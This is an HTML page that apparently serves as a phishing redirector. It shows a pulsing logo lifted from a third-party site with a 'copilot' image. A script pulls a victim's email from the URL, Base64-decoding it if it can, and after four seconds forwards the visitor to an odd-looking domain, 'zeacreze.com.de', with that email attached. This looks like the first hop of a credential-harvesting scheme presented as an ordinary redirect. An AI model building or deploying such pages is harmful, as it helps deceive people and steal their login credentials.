<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      background: #FFFFFF;
      margin: 0;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .logo {
      width: 150px;
      height: 150px;
      background: url('https://cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
      animation: pulse 1.5s infinite ease-in-out;
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 0.8; }
      50% { transform: scale(1.1); opacity: 1; }
      100% { transform: scale(1); opacity: 0.8; }
    }
  </style>
</head>
<body>
  <div class="logo"></div>

  <script>
    // Extract email parameter from ?email= in the current URL
    function getEmailFromQuery() {
      const params = new URLSearchParams(window.location.search);
      let email = params.get("email");

      if (!email) return null;

      // Try to decode Base64 â€” if it fails, use as-is
      try {
        const decoded = atob(email);
        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
          email = decoded;
        }
      } catch (e) {
        // Not Base64, leave as-is
      }
      return email;
    }

    const email = getEmailFromQuery();
    const baseURL = "https://06.zeacreze.com.de/AQBiHa@54cYLc58/";

    setTimeout(() => {
      if (email) {
        window.location.href = `${baseURL}/$${encodeURIComponent(email)}`;
      } else {
        window.location.href = baseURL;
      }
    }, 4000);
  </script>
</body>
</html>
